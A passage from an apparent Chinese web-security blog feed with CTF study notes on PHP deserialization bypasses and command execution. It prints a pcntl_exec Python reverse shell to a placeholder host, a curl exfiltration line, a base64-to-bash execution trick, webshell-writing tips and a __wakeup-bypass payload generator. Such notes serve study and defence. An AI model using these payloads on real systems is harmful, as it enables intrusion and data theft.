class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Test</span></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">notexists</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="../images/image-20221027114101336.png" alt="image-20221027114101336" style="zoom:67%;" /><p>因为我们设置了Content-length，那么读取了data&#x3D;abc后就会舍弃掉后面的数据</p><h2 id="文件操作类"><a href="#文件操作类" class="headerlink" title="文件操作类"></a>文件操作类</h2><p>注：FilesystemIterator 是DirectoryIterator的子类，所以可以将DirectoryIterator换为FilesystemIterator。</p><h4 id="遍历目录"><a href="#遍历目录" class="headerlink" title="遍历目录"></a>遍历目录</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;./&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$tmp</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$tmp</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="../images/image-20221128122840348.png" alt="image-20221128122840348" style="zoom:80%;" /><h4 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a>查找文件</h4><ul><li><p>查找根目录的flag文件名</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&quot;f*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128123553510.png" alt="image-20221128123553510"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///f*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20221128123054538.png" alt="image-20221128123054538"></p><blockquote><p>​<strong>GlobIterator 类支持直接通过模式匹配来寻找文件路径</strong></p></blockquote><ul><li><p>确认文件路径</p><p>假设现在知道flag的文件名为flag，但不知道具体路径</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 目录穿越</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob://../../../flag&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128123216008.png" alt="image-20221128123216008"></p><p>当输出flag时，说明路径是正确的。</p></li></ul><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f1ag</span>=<span class="title function_ invoke__">implode</span>(<span class="keyword">array</span>(<span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/flag&#x27;</span>)));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$f1ag</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128122206828.png" alt="image-20221128122206828"></p><h1 id="一些绕过trick"><a href="#一些绕过trick" class="headerlink" title="一些绕过trick"></a>一些绕过trick</h1><p><a href="https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#16%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E7%9A%84%E8%BF%87%E6%BB%A4">php(phar)反序列化漏洞及各种绕过姿势</a></p><h3 id="GC机制绕过抛出异常"><a href="#GC机制绕过抛出异常" class="headerlink" title="GC机制绕过抛出异常"></a>GC机制绕过抛出异常</h3><blockquote><p>正常情况下抛出异常并且没有捕捉的话php是不会执行析构函数的</p><p>但在laravel这种框架里通常都有全局的错误处理与异常捕捉，显示通用的500或者错误页面。 只要异常被捕捉，后面的析构就会执行了。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="keyword">new</span> test, <span class="literal">null</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;i:1;N&#x27;</span>, <span class="string">&#x27;i:0;N&#x27;</span>, <span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><blockquote><p>因为<strong>反序列化的过程是顺序执行</strong>的，所以到第一个属性时，会将<code>Array[0]</code>设置为对象，同时我们又将<code>Array[0]</code>设置为<code>null</code>，这样前面的<code>test</code>对象便丢失了引用，就会被GC所捕获，就可以执行<code>__destruct</code>了</p></blockquote><h3 id="绕过正则"><a href="#绕过正则" class="headerlink" title="绕过正则"></a>绕过正则</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;nonono!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><p>用+O代替O</p></li><li><p>用数组绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></li></ul><h3 id="绕过字符过滤"><a href="#绕过字符过滤" class="headerlink" title="绕过字符过滤"></a>绕过字符过滤</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/username/&#x27;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono!!!&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>序列字符串中<strong>表示字符类型的s大写时，会被当成16进制解析。</strong></p></blockquote><h3 id="绕过wake-up"><a href="#绕过wake-up" class="headerlink" title="绕过wake_up"></a>绕过wake_up</h3><ul><li><strong>php版本 PHP5&lt;5.6.25，PHP7 &lt; 7.0.10</strong></li></ul><p><strong>反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup( )</code>的执行。</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span>= <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Demo</span>);</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$x</span>);<span class="comment">//绕过preg_match()</span></span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:3:&#x27;</span>,<span class="variable">$x</span>);<span class="comment">//绕过__wakeup()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>引用变量</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$a</span> = &amp;<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> =<span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221026153815014.png" alt="image-20221026153815014"></p><blockquote><p>在php里&amp;相当于两个变量都指向同一个地址，修改一个会影响到另一个。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>任意命令执行</title>
      <link href="/2023/05/31/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/05/31/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认无回显</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()和反引号</span><br><span class="line"><span class="title function_ invoke__">popen</span>()，<span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认有回显</span></span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br></pre></td></tr></table></figure><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">exec</span> ( 命令，结果数组 ，状态码 )</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;whoami&quot;</span>,<span class="variable">$output</span>,<span class="variable">$return_var</span>);</span><br><span class="line"><span class="comment"># 默认无回显，要想获得结果，就要输出第二个参数</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment"># 命令执行成功的状态码为0</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$return_var</span>);</span><br></pre></td></tr></table></figure><h3 id="system"><a href="#system" class="headerlink" title="system()"></a><strong>system()</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">system</span> ( 命令, 状态码 )</span><br></pre></td></tr></table></figure><p>实际上是执行了<code>sh -c &quot;command&quot;</code>命令</p><p><strong>system()函数</strong>执行有回显，将执行结果输出到页面上</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><strong>passthru()</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void passthru ( 命令, 状态码  )</span><br></pre></td></tr></table></figure><p>和<strong>system函数</strong>类似，执行有回显，将执行结果输出到页面上</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="shell-exec-和-反引号"><a href="#shell-exec-和-反引号" class="headerlink" title="shell_exec()和 反引号"></a><strong>shell_exec()和 反引号</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">shell_exec</span>( 命令 )</span><br></pre></td></tr></table></figure><p><strong>shell_exec()函数</strong>默认无回显，通过 <strong>echo</strong> 可将执行结果输出到页面</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>shell_exec() 函数实际上仅是反撇号 () 操作符的变体，当禁用shell_exec时，&#96; 也不可执行</strong></p><p>反引号在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    `whoami`;</span><br><span class="line">    <span class="keyword">echo</span> `whoami`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a><strong>popen()</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource popen ( string $command , string $mode )</span><br></pre></td></tr></table></figure><p>函数需要两个参数，一个是执行的命令**<code>command</code><strong>，另外一个是指针文件的连接模式</strong><code>mode</code>**，有<code>r</code>和<code>w</code>代表读和写。</p><p>函数不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&#x27;ls -l&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;popen() failed\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$line</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><p>与<code>popen()</code>类似，只是可以开两个管道。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">resource <span class="title function_ invoke__">proc_open</span> ( </span><br><span class="line"><span class="keyword">string</span> <span class="variable">$cmd</span> , </span><br><span class="line"><span class="keyword">array</span> <span class="variable">$descriptorspec</span> , </span><br><span class="line"><span class="keyword">array</span> &amp;<span class="variable">$pipes</span> [, <span class="keyword">string</span> <span class="variable">$cwd</span> [, <span class="keyword">array</span> <span class="variable">$env</span> [, <span class="keyword">array</span> <span class="variable">$other_options</span> ]]] </span><br><span class="line">)</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;ipconfig&quot;</span>;  </span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(  </span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//标准输入 </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//标准输出内容 </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//标准输出错误 </span></span><br><span class="line"> );  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//打开一个进程通道 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//为什么是$pipes[1]，因为1是输出内容 stream_get_contents — 读取资源流到一个字符串</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h3><p>前提条件：<strong>PHP安装并启用了pcntl插件</strong></p><p>pcntl是linux下的一个扩展，可以支持php的多线程操作。很多时候会碰到禁用exec函数的情况，但如果运维人员安全意识不强或对PHP不甚了解，则很有可能忽略pcntl扩展的相关函数。</p><p>pcntl_exec()是pcntl插件专有的命令执行函数来执行系统命令函数，可以在当前进程空间执行指定的程序。</p><p>利用pcntl_exec()执行test.sh：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_exec&#x27;</span>)) &#123;</span><br><span class="line">   <span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/bin/bash&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;/tmp/test.sh&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;pcntl extension is not support!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于pcntl_exec()执行命令是没有回显的，所以其常与python结合来反弹shell：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/usr/bin/python&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;ip&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span>));</span><br></pre></td></tr></table></figure><h2 id="判断操作系统类型"><a href="#判断操作系统类型" class="headerlink" title="判断操作系统类型"></a>判断操作系统类型</h2><h3 id="有回显情况"><a href="#有回显情况" class="headerlink" title="有回显情况"></a>有回显情况</h3><p>ping命令观察TTL，windows一般在100以上，linux一般是100以下。</p><h3 id="无回显情况"><a href="#无回显情况" class="headerlink" title="无回显情况"></a>无回显情况</h3><ul><li><p>路径大小写敏感</p></li><li><p>通过<code>ping</code>命令</p><blockquote><p>Windows下的Ping命令每间隔一秒会发送一个ICMP ECHO_REQUEST 包，因此可以利用 Ping 命令来近似地模拟等待指定秒数的效果</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping -n 2 127.0.0.1</span><br><span class="line">ping -n 3 127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230519171132332.png" alt="image-20230519171132332"></p><p><img src="/../images/image-20230519171119146.png" alt="image-20230519171119146"></p></li></ul><h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><ul><li><p>判断是否执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">报错</span><br><span class="line">延时</span><br></pre></td></tr></table></figure></li><li><p>反弹shell</p><p>在线生成：<a href="https://zgao.top/tools/reverse/">https://zgao.top/tools/reverse/</a></p></li><li><p>外带</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl ip:port\`cmd`</span><br><span class="line">dnslog</span><br></pre></td></tr></table></figure><p>不出网+DNS请求出网</p><p><a href="https://github.com/A0WaQ4/HexDnsEchoT">https://github.com/A0WaQ4/HexDnsEchoT</a></p></li><li><p>将文件移动到可访问目录（网站目录，静态 文件目录）</p><ul><li><p>读取内容重定向写入文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /flag &gt;1</span><br></pre></td></tr></table></figure></li><li><p>复制</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /f* .</span><br></pre></td></tr></table></figure></li><li><p>创建链接文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /f* 1</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="写🐎"><a href="#写🐎" class="headerlink" title="写🐎"></a>写🐎</h3><h4 id="确定网站路径"><a href="#确定网站路径" class="headerlink" title="确定网站路径"></a>确定网站路径</h4><ul><li><p>Windows</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /x /s /b yokan_test.js</span><br><span class="line">for /r c:\ %i in (yokan_test.js*) do @echo %i</span><br><span class="line">dir /s/a-d/b yokan_test.js</span><br></pre></td></tr></table></figure></li><li><p>Linux</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . -type f -name 1.js|while read f;do sh -c &#x27;id;pwd;hostname;/sbin/ifconfig&#x27; &gt;$(dirname $f)/test.txt;done</span><br><span class="line"></span><br><span class="line">locate /js/1.js|while read f;do sh -c &#x27;id;pwd;ifconfig&#x27;&gt;$(dirname $f)/test1.txt;done</span><br></pre></td></tr></table></figure></li></ul><h4 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h4><ul><li><p>远程下载</p><p><a href="https://paper.seebug.org/834/#windows">红队后渗透测试中的文件传输技巧</a></p></li><li><p>重定向写入</p><blockquote><p><strong>webshell特殊符号问题，可以先做base64编码写入，然后再解码</strong></p></blockquote></li></ul><h4 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h4><p>重定向写入</p><h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="多条命令执行"><a href="#多条命令执行" class="headerlink" title="多条命令执行"></a>多条命令执行</h4><table><thead><tr><th align="center"></th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">|</td><td align="center">管道，前一个命令的输出作为后一个命令的输入</td></tr><tr><td align="center">；</td><td align="center">依次执行命令</td></tr><tr><td align="center">||</td><td align="center">如果前一条命令执行不成功则执行下一条命令</td></tr><tr><td align="center">&amp;&amp;</td><td align="center">如果前一条命令执行成功则执行下一条命令</td></tr><tr><td align="center">%0a  &#x2F; %0d%0a</td><td align="center">换行执行命令</td></tr><tr><td align="center">&#96;&#96;</td><td align="center">内敛执行</td></tr><tr><td align="center">$()</td><td align="center">内敛执行</td></tr></tbody></table><h4 id=""><a href="#" class="headerlink" title="."></a>.</h4><p>Linux 中，<code>.</code>也叫<code>period</code>，它的作用和<code>source</code>一样，就是用当前的 shell 执行一个文件中的命令。比如，当前运行的 shell 是 bash，则 <code>. filename</code>的意思就是用 bash 执行 filename 文件中的命令。</p><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><ul><li>base64</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;base64(payload)&#x27; | base64 -d | bash</span><br></pre></td></tr></table></figure><ul><li><p>进制绕过</p><p>shell解析八进制，<code>ls</code> → <code>$&#39;\154&#39;$&#39;\163&#39;</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ $&#x27;\154&#x27;$&#x27;\163&#x27;</span><br><span class="line">1                           jdk-8u333-linux-x64.tar.gz:Zone.Identifier  result.txt     ysoserial.jar:Zone.Identifier</span><br><span class="line">jdk-8u333-linux-x64.tar.gz  jdk8</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php传参时的格式</span></span><br><span class="line">$(printf <span class="string">&quot;\154\163&quot;</span>)</span><br><span class="line">$(<span class="keyword">echo</span> <span class="string">&quot;\154\163&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>进制转换</li></ul> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(khaz㉿kali)-[~/桌面]</span><br><span class="line">└─$ echo $((2#111))</span><br><span class="line">7</span><br></pre></td></tr></table></figure></li></ul><h4 id="php绕过"><a href="#php绕过" class="headerlink" title="php绕过"></a>php绕过</h4><p>php花样就多了😋</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php -r &#x27;system(chr(108).chr(115))&#x27;</span><br></pre></td></tr></table></figure><h4 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" 